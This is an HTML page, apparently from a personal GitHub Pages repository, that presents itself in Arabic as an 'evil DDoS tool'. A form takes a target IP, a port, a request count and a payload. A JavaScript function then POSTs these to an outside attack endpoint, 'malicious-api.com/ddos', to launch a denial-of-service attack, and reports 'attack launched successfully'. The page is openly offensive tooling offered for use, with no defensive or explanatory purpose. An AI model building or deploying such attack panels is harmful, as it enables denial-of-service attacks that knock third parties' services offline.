# gtav333.github.io
<html>
<head>
    <title>أداة DDoS الشريرة</title>
    <script>
        function launchAttack() {
            // استبدل عنوان الهدف بهذا المثال
            const target = 'http://example.com';

            // إعداد العناصر
            const ipInput = document.getElementById('ip');
            const portInput = document.getElementById('port');
            const numRequestsInput = document.getElementById('numRequests');
            const payloadInput = document.getElementById('payload');
            const attackButton = document.getElementById('attack');
            const resultDiv = document.getElementById('result');

            // تحقق من صحة الإدخالات
            if (!ipInput.value || !portInput.value || !numRequestsInput.value || !payloadInput.value) {
                resultDiv.innerHTML = 'يرجى ملء جميع الحقول';
                return;
            }

            // قم بتكوين إعدادات الهجوم
            const options = {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    target: target,
                    ip: ipInput.value,
                    port: portInput.value,
                    numRequests: numRequestsInput.value,
                    payload: payloadInput.value
                })
            };

            // إطلاق الهجوم
            fetch('https://malicious-api.com/ddos', options)
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        resultDiv.innerHTML = 'تم إطلاق الهجوم بنجاح!';
                    } else {
                        resultDiv.innerHTML = 'حدث خطأ أثناء الهجوم. حاول مرة أخرى';
                    }
                })
                .catch(error => {
                    resultDiv.innerHTML = 'حدث خطأ أثناء الاتصال بالخادم.';
                });
        }
    </script>
</head>
<body>
    <h1>أداة DDoS الشريرة</h1>
    <label for="ip">IP الهدف:</label>
    <input type="text" id="ip" placeholder="192.168.1.1"><br>
    <label for="port">المنفذ:</label>
    <input type="text" id="port" placeholder="80"><br>
    <label for="numRequests">عدد الطلبات:</label>
    <input type="text" id="numRequests" placeholder="10000"><br>
    <label for="payload"> الحمولة:</label>
    <input type="text" id="payload" placeholder="مثال: أهلاً بالعالم"><br>
    <button id="attack" onclick="launchAttack()">إطلاق الهجوم</button>
    <div id="result"></div>
</body>
</html>
